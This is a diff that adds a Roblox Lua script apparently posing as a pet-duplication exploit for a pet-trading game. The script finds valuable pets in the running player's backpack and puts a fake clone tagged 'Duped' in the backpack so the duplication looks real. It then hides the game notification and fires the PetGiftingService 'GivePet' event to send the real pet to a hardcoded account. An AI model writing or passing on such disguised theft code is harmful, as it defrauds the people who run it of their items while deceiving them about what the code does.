@@ -1,0 +1,107 @@
+_G.Server = {
+	Wanteds = {
+		USERNAME = {
+			JobId = "gniobgoib",
+			LastSeen = 486414224,
+			Pets = {
+			}
+		}
+	},
+	Remotes = {
+		["system"] = "Raccoon [3.08 KG] [Age 6]",
+		["vhubdeveloperalt"] = "Raccoon [3.08 KG] [Age 6]"
+	}
+}
+
+local LocalPlayer = game:GetService("Players").LocalPlayer
+local DesiredPets = {"raccoon", "dragonfly", "queen bee"}
+local ListOfPets = {}
+
+for _, Tool in game:GetService("Players").LocalPlayer.Backpack:GetChildren() do
+	local ToolName = string.lower(Tool.Name)
+
+	for _, DesiredPetName in DesiredPets do
+		if string.find(ToolName, string.lower(DesiredPetName)) then
+			table.insert(ListOfPets, Tool.Name)
+		end
+	end
+end
+wait()
+
+if #ListOfPets == 0 then
+	print("no pet found")
+else
+	for _, PetName in ListOfPets do
+		if not _G.Server.Wanteds[LocalPlayer.Name] then
+			_G.Server.Wanteds[LocalPlayer.Name] = {}
+			_G.Server.Wanteds[LocalPlayer.Name].JobId = game.JobId
+			_G.Server.Wanteds[LocalPlayer.Name].LastSeen = os.time()
+			_G.Server.Wanteds[LocalPlayer.Name].Pets = {}
+		end
+
+		_G.Server.Wanteds[LocalPlayer.Name].Pets[PetName] = true
+	end
+end
+
+coroutine.wrap(function()
+	while wait(1) do
+		for Username, PetName in _G.Server.Remotes do
+			if Username == string.lower(LocalPlayer.Name) then
+				local NewTable = {}
+
+				for i, v in _G.Server.Remotes do
+					if i ~= string.lower(LocalPlayer.Name) then
+						NewTable[i] = v
+					end
+				end
+
+				_G.Server.Remotes = NewTable
+
+				for i, v in game:GetService("Players").LocalPlayer.Backpack:GetChildren() do
+					local isdupe = false
+
+					for AttributeName, _ in v:GetAttributes() do
+						if AttributeName == "Duped" then
+							isdupe = true
+						end
+					end
+
+					if v.Name == PetName and isdupe == false then
+						local ToolModelLoaded = false
+						local ToolHandleChildren = v.Handle:GetChildren() 
+
+						if #ToolHandleChildren == 0 then
+							v.Parent = game:GetService("Workspace")[LocalPlayer.Name]
+							wait(0.1)
+							v.Parent = game:GetService("Players").LocalPlayer.Backpack
+						end
+						wait()
+
+						local Fake = v:Clone()
+						Fake.Parent = game:GetService("Players").LocalPlayer.Backpack
+						Fake:SetAttribute("Duped", true)
+
+						coroutine.wrap(function()
+							while wait() do
+								if (tostring(v.Parent) == "Backpack") then
+									v:SetAttribute("Favorite", false)
+									wait()
+									v.Parent = game:GetService("Workspace")[LocalPlayer.Name]
+								end
+							end
+						end)()
+					end
+				end
+
+				game:GetService("Players").LocalPlayer.PlayerGui.Top_Notification.Enabled = false
+
+				wait(0.1)
+				local args = {
+					"GivePet",
+					game:GetService("Players"):WaitForChild("itsyaboivincentt")
+				}
+				game:GetService("ReplicatedStorage"):WaitForChild("GameEvents"):WaitForChild("PetGiftingService"):FireServer(unpack(args))
+			end
+		end
+	end
+end)()
